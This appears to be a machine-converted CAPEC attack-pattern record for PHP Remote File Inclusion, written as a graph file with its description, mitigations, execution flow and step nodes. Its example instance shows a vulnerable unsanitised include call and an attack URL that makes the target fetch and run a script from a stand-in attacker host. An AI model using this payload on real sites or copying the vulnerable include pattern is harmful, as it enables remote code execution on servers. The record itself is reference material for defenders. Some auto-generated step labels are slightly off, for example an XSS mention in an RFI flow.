graph [
  directed 1
  capec_id "193"
  name "PHP Remote File Inclusion"
  abstraction "Detailed"
  status "Draft"
  description "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized &#34;include&#34; or &#34;require&#34; call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions."
  likelihood "High"
  severity "High"
  related_attack_patterns "_networkx_list_start"
  related_attack_patterns [
    capec_id "253"
    nature "ChildOf"
  ]
  prerequisites "Target application server must allow remote files to be included in the &#34;require&#34;, &#34;include&#34;, etc. PHP directives"
  prerequisites "The adversary must have the ability to make HTTP requests to the target web application."
  skills_required [
    level "Low"
    description "To inject the malicious payload in a web page"
  ]
  skills_required [
    level "Medium"
    description "To bypass filters in the application"
  ]
  resources_required "_networkx_list_start"
  resources_required "None: No specialized resources are required to execute this type of attack."
  consequences [
    scope "_networkx_list_start"
    scope "Integrity"
    impact "Modify Data"
  ]
  consequences [
    scope "_networkx_list_start"
    scope "Confidentiality"
    impact "Read Data"
  ]
  consequences [
    scope "_networkx_list_start"
    scope "Authorization"
    impact "Execute Unauthorized Commands"
  ]
  consequences [
    scope "Accountability"
    scope "Authentication"
    scope "Authorization"
    scope "Non-Repudiation"
    impact "Gain Privileges"
  ]
  consequences [
    scope "Access Control"
    scope "Authorization"
    impact "Bypass Protection Mechanism"
  ]
  mitigations "Implementation: Perform input validation for all remote content, including remote and user-generated content"
  mitigations "Implementation: Only allow known files to be included (allowlist)"
  mitigations "Implementation: Make use of indirect references passed in URL parameters instead of file names"
  mitigations "Configuration: Ensure that remote scripts cannot be include in the &#34;include&#34; or &#34;require&#34; PHP directives"
  example_instances "_networkx_list_start"
  example_instances "The adversary controls a PHP script on a server &#34;http://attacker.com/rfi.txt&#34; The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes their own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the &#34;.txt&#34; prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script."
  related_weaknesses "98"
  related_weaknesses "80"
  matched_cwes "80"
  matched_cwes "98"
  taxonomy_mappings "[]"
  execution_flow [
    step "1"
    phase "Explore"
    description "[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find."
    techniques "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL."
    techniques "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms."
    techniques "Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery."
  ]
  execution_flow [
    step "2"
    phase "Experiment"
    description "[Attempt variations on input parameters] The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before. They send parameters that include variations of payloads which include a reference to the remote PHP script. They record all the responses from the server that include the output of the execution of remote PHP script."
    techniques "Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script."
    techniques "Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs."
  ]
  execution_flow [
    step "3"
    phase "Exploit"
    description "[Run arbitrary server-side code] As the adversary succeeds in exploiting the vulnerability, they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with."
    techniques "_networkx_list_start"
    techniques "Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script."
  ]
  node [
    id 0
    label "follow_all_public_links_on_a_web_site"
  ]
  node [
    id 1
    label "record_all_the_links_they_find"
  ]
  node [
    id 2
    label "make_special_note_of_any_links_that_include_parameters_in_the_url"
  ]
  node [
    id 3
    label "record_all_links_visited_during_a_manual_traversal_of_the_web_application"
  ]
  node [
    id 4
    label "identify_forms_that_are_get_method_forms_rather_than_post_forms"
  ]
  node [
    id 5
    label "explore_the_website"
  ]
  node [
    id 6
    label "facilitate_the_analysis"
  ]
  node [
    id 7
    label "send_parameters_that_include_variations_of_payloads_which_include_a_reference_to_the_remote_php_script"
  ]
  node [
    id 8
    label "record_all_the_responses_from_the_server_that_include_the_output_of_the_execution_of_remote_php_script"
  ]
  node [
    id 9
    label "include_a_reference_to_the_adversary"
  ]
  node [
    id 10
    label "record_results_of_manual_input_of_xss_probes_in_known_urls"
  ]
  node [
    id 11
    label "run_arbitrary_server_side_code"
  ]
  node [
    id 12
    label "develop_malicious_php_script_that_is_injected_through_vectors_identified_during_the_experiment_phase_and_executed_by_the_application_server_to_execute_a_custom_php_script"
  ]
  node [
    id 13
    label "follow_include_get_filename"
  ]
  node [
    id 14
    label "create_an_http_request_that_passes_their_own_script_in_the_include"
  ]
  node [
    id 15
    label "make_http_requests_to_the_target_web_application"
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 1
    target 2
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 2
    target 4
  ]
  edge [
    source 3
    target 2
  ]
  edge [
    source 4
    target 5
  ]
  edge [
    source 5
    target 6
  ]
  edge [
    source 6
    target 7
  ]
  edge [
    source 7
    target 8
  ]
  edge [
    source 8
    target 9
  ]
  edge [
    source 9
    target 10
  ]
  edge [
    source 10
    target 11
  ]
  edge [
    source 11
    target 12
  ]
  edge [
    source 12
    target 13
  ]
  edge [
    source 13
    target 14
  ]
  edge [
    source 14
    target 15
  ]
]
